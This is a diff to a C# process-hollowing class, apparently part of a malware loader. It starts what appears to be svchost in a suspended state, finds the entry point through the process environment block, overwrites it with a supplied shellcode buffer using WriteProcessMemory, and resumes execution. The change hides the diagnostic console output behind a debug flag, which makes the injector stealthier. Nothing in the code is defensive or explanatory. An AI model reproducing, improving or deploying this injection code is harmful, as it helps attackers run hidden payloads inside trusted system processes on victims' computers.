@@ -11,10 +11,10 @@ internal static class HollowProcess
     const int OFFSET_ENTRYPOINT_RVA = 0x28;
     const int CLASS_PROCESS_INFORMATION = 0x0;
 
-    internal static Task Run(byte[] buf){
+    internal static Task Run(byte[] buf, bool debug = false){
         var si = new StartupInfo();
         var result = Lib.CreateProcessW(null, GetBinary(), IntPtr.Zero, IntPtr.Zero, false, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out ProcessInformation pi);
-        if (result)
+        if (result && debug)
         {
             Console.WriteLine($"CreateProcess was successful - SvcHost PID: {pi.dwProcessId}");
         }
@@ -25,18 +25,18 @@ internal static class HollowProcess
             return Task.CompletedTask;
         }
 
-        var entryPointAddress = GetEntryPoint(pi.hProcess);
-        Console.WriteLine($"Address of entry point: 0x{entryPointAddress:X}");
+        var entryPointAddress = GetEntryPoint(pi.hProcess, debug);
+        if(debug) Console.WriteLine($"Address of entry point: 0x{entryPointAddress:X}");
 
         Lib.WriteProcessMemory(pi.hProcess, entryPointAddress, buf, buf.Length, out IntPtr nRead);
         var writeStatus = Lib.GetLastWin32Error();
         if (writeStatus != SystemErrorCodes.ERROR_SUCCESS)
         {
-            Console.WriteLine($"Error writing to process memory - error: {writeStatus}");
+            if(debug) Console.WriteLine($"Error writing to process memory - error: {writeStatus}");
             return Task.CompletedTask;
         }
 
-        Console.WriteLine($"Wrote {nRead.ToInt64()} bytes to process memory");
+        if(debug) Console.WriteLine($"Wrote {nRead.ToInt64()} bytes to process memory");
 
         Execute(pi);
         return Task.CompletedTask;
@@ -68,15 +68,15 @@ internal static class HollowProcess
         return Path.Combine(names[0], names[1], names[2], new string(nm));
     }
 
-    private static IntPtr GetEntryPoint(IntPtr hProcess)
+    private static IntPtr GetEntryPoint(IntPtr hProcess, bool debug = false)
     {
-        Console.WriteLine($"Retrieving entrypoint...");
+        if(debug) Console.WriteLine($"Retrieving entrypoint...");
         var bi = new ProcessBasicInformation();
         uint tmp = 0;
         //retrieve pointer to PEB
         var ret = Lib.ZwQueryInformationProcess(hProcess, CLASS_PROCESS_INFORMATION, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
         IntPtr ptrToImageBase = (IntPtr)((long)bi.PebAddress + 0x10);
-        Console.WriteLine($"Pointer to image base: 0x{ptrToImageBase:X}");
+        if(debug) Console.WriteLine($"Pointer to image base: 0x{ptrToImageBase:X}");
 
         //read address of image base
         var addrBuf = new byte[IntPtr.Size];
